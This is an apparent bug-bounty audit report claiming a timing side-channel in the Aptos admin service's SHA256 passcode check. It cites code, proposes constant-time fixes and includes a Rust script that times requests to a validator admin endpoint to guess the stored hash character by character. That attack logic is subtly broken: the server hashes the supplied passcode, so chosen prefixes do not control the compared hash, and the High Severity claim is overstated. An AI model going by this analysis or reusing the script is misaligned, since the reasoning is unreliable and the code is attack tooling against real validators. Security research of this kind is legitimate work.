# Audit Report

## Title
Timing Side-Channel Vulnerability in Admin Service PasscodeSha256 Authentication Allows Hash Discovery

## Summary
The admin service's PasscodeSha256 authentication mechanism uses a non-constant-time string comparison (`==` operator) when verifying passcode hashes, allowing attackers to exploit timing side-channels to gradually discover the correct hash and gain unauthorized access to sensitive admin endpoints.

## Finding Description

The vulnerability exists in the `serve_requests()` function where passcode authentication is performed. [1](#0-0) 

The authentication logic extracts the passcode from the query parameters, computes its SHA256 hash, and compares it against the stored hash using Rust's standard `==` operator. This comparison is NOT constant-time - it performs byte-by-byte comparison and returns early on the first mismatch, creating a measurable timing difference based on how many characters match.

**Attack Flow:**

1. Attacker sends requests to admin endpoints with different passcodes
2. Server computes `sha256::digest(passcode)` for each request
3. Comparison `sha256::digest(passcode) == *passcode_sha256` leaks timing information
4. When the computed hash matches more prefix characters of the stored hash, the comparison takes microseconds longer
5. Through statistical analysis of thousands of requests, the attacker can discover the hash character-by-character (64 hex characters)
6. With the hash discovered, attacker can either:
   - Perform offline brute-force on weak passcodes to recover the original
   - Directly use timing feedback to test passcode candidates more efficiently

The admin service configuration enforces authentication on mainnet. [2](#0-1) 

Once authenticated, the attacker gains access to highly sensitive endpoints that expose internal validator state, consensus database contents, quorum store data, block information, and mempool data. [3](#0-2) 

## Impact Explanation

This vulnerability is classified as **HIGH SEVERITY** based on the following factors:

1. **Access Control Bypass**: Breaks the authentication barrier protecting admin endpoints that expose sensitive validator internals
2. **Information Disclosure**: Successful exploitation grants access to:
   - Consensus database dumps revealing validator state and voting history
   - Quorum store contents showing batched transactions
   - Block data exposing consensus execution details  
   - Mempool parking lot data
   - CPU profiling and thread dumps of the validator process
3. **Attack Amplification**: Leaked consensus and validator state information can enable sophisticated secondary attacks on the validator or network
4. **Mainnet Impact**: Authentication is mandatory on mainnet, making this a real-world exploitable vulnerability

Per the Aptos bug bounty program, this qualifies as **High Severity** (up to $50,000) as it represents a "Significant protocol violation" by circumventing required authentication controls.

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

The attack is practically feasible because:

1. **Well-Known Technique**: Timing attacks on hash comparisons are documented in academic literature and have been successfully exploited against real systems (e.g., timing attacks on HMAC verification)
2. **Network Feasibility**: While network jitter adds noise, statistical techniques (e.g., using thousands of samples per character position) can reliably extract timing differences
3. **Accessible Target**: The admin service listens on a network port and processes unauthenticated requests before the comparison
4. **Observable Behavior**: Response time differences are measurable via standard HTTP timing tools

**Attacker Requirements:**
- Ability to send HTTP requests to the admin service endpoint
- Statistical analysis tools (readily available)
- Time to collect sufficient timing samples (hours to days depending on network conditions)

**Complexity:** Medium - Requires statistical sophistication but no insider access or special privileges.

## Recommendation

Replace the standard `==` comparison with a constant-time comparison function to prevent timing side-channels.

**Option 1: Use a constant-time comparison library**
```rust
// Add to Cargo.toml:
// subtle = "2.5"

use subtle::ConstantTimeEq;

// In serve_requests():
if let Some(passcode) = passcode {
    let computed_hash = sha256::digest(passcode);
    let computed_bytes = computed_hash.as_bytes();
    let expected_bytes = passcode_sha256.as_bytes();
    
    if computed_bytes.len() == expected_bytes.len() 
        && computed_bytes.ct_eq(expected_bytes).into() 
    {
        authenticated = true;
    }
}
```

**Option 2: Use ring's constant-time verification**
```rust
// Add to Cargo.toml:  
// ring = "0.17"

use ring::constant_time;

// In serve_requests():
if let Some(passcode) = passcode {
    let computed_hash = sha256::digest(passcode);
    if constant_time::verify_slices_are_equal(
        computed_hash.as_bytes(),
        passcode_sha256.as_bytes()
    ).is_ok() {
        authenticated = true;
    }
}
```

**Additional Hardening:**
- Implement rate limiting on authentication failures
- Add exponential backoff after failed authentication attempts
- Log authentication attempts for monitoring

## Proof of Concept

```rust
// Timing attack demonstrator (conceptual - would need refinement for network conditions)
use std::time::Instant;
use std::collections::HashMap;

fn time_request(url: &str, passcode: &str) -> u128 {
    let client = reqwest::blocking::Client::new();
    let start = Instant::now();
    let _ = client.get(url)
        .query(&[("passcode", passcode)])
        .send();
    start.elapsed().as_nanos()
}

fn discover_hash_character(
    url: &str,
    known_prefix: &str,
    samples_per_char: usize
) -> Option<char> {
    let hex_chars = "0123456789abcdef";
    let mut timings: HashMap<char, Vec<u128>> = HashMap::new();
    
    // Collect timing samples for each possible next character
    for _ in 0..samples_per_char {
        for c in hex_chars.chars() {
            let candidate = format!("{}{}", known_prefix, c);
            let time = time_request(url, &candidate);
            timings.entry(c).or_insert(vec![]).push(time);
        }
    }
    
    // Find character with highest average timing (indicates more matches)
    let mut best_char = None;
    let mut best_avg = 0u128;
    
    for (c, times) in timings.iter() {
        let avg: u128 = times.iter().sum::<u128>() / times.len() as u128;
        if avg > best_avg {
            best_avg = avg;
            best_char = Some(*c);
        }
    }
    
    best_char
}

fn main() {
    let admin_url = "http://validator-ip:9102/profilez";
    let mut discovered_hash = String::new();
    
    // Discover all 64 hex characters of the SHA256 hash
    for position in 0..64 {
        println!("Discovering position {}...", position);
        if let Some(c) = discover_hash_character(
            admin_url,
            &discovered_hash,
            1000  // 1000 samples per character
        ) {
            discovered_hash.push(c);
            println!("Discovered so far: {}", discovered_hash);
        } else {
            println!("Attack failed at position {}", position);
            break;
        }
    }
    
    println!("Final discovered hash: {}", discovered_hash);
}
```

## Notes

The Aptos codebase demonstrates awareness of constant-time requirements in cryptographic operations through its dedicated constant-time testing framework. [4](#0-3) 

This makes the non-constant-time comparison in the admin service authentication particularly concerning, as it represents an oversight in applying known security best practices to authentication logic. The vulnerability is exploitable by external attackers without any privileged access and directly compromises the security boundary protecting sensitive validator operations.

### Citations

**File:** crates/aptos-admin-service/src/server/mod.rs (L160-171)
```rust
                    AuthenticationConfig::PasscodeSha256(passcode_sha256) => {
                        let query = req.uri().query().unwrap_or("");
                        let query_pairs: HashMap<_, _> =
                            url::form_urlencoded::parse(query.as_bytes()).collect();
                        let passcode: Option<String> =
                            query_pairs.get("passcode").map(|p| p.to_string());
                        if let Some(passcode) = passcode {
                            if sha256::digest(passcode) == *passcode_sha256 {
                                authenticated = true;
                            }
                        }
                    },
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L183-243)
```rust
        match (req.method().clone(), req.uri().path()) {
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/profilez") => handle_cpu_profiling_request(req).await,
            #[cfg(target_os = "linux")]
            (hyper::Method::GET, "/threadz") => handle_thread_dump_request(req).await,
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/stats") => {
                malloc::handle_malloc_stats_request(context.config.malloc_stats_max_len)
            },
            #[cfg(unix)]
            (hyper::Method::GET, "/malloc/dump_profile") => malloc::handle_dump_profile_request(),
            (hyper::Method::GET, "/debug/consensus/consensusdb") => {
                let consensus_db = context.consensus_db.read().clone();
                if let Some(consensus_db) = consensus_db {
                    consensus::handle_dump_consensus_db_request(req, consensus_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/quorumstoredb") => {
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(quorum_store_db) = quorum_store_db {
                    consensus::handle_dump_quorum_store_db_request(req, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/consensus/block") => {
                let consensus_db = context.consensus_db.read().clone();
                let quorum_store_db = context.quorum_store_db.read().clone();
                if let Some(consensus_db) = consensus_db
                    && let Some(quorum_store_db) = quorum_store_db
                {
                    consensus::handle_dump_block_request(req, consensus_db, quorum_store_db).await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Consensus db and/or quorum store db is not available.",
                    ))
                }
            },
            (hyper::Method::GET, "/debug/mempool/parking-lot/addresses") => {
                let mempool_client_sender = context.mempool_client_sender.read().clone();
                if let Some(mempool_client_sender) = mempool_client_sender {
                    mempool::mempool_handle_parking_lot_address_request(req, mempool_client_sender)
                        .await
                } else {
                    Ok(reply_with_status(
                        StatusCode::NOT_FOUND,
                        "Mempool parking lot is not available.",
                    ))
                }
            },
            _ => Ok(reply_with_status(StatusCode::NOT_FOUND, "Not found.")),
        }
```

**File:** config/src/config/admin_service_config.rs (L67-78)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
            }
        }
```

**File:** crates/aptos-crypto/src/constant_time/mod.rs (L1-10)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

//! This module provides implementations of "dudect" statistical tests to check some of our code
//! is constant-time (e.g., like scalar multiplication).

/// Module for testing that blstrs scalar multiplication is constant-time
pub mod blstrs_scalar_mul;
/// Module for testing that zkcrypto scalar multiplication is constant-time
pub mod zkcrypto_scalar_mul;
```
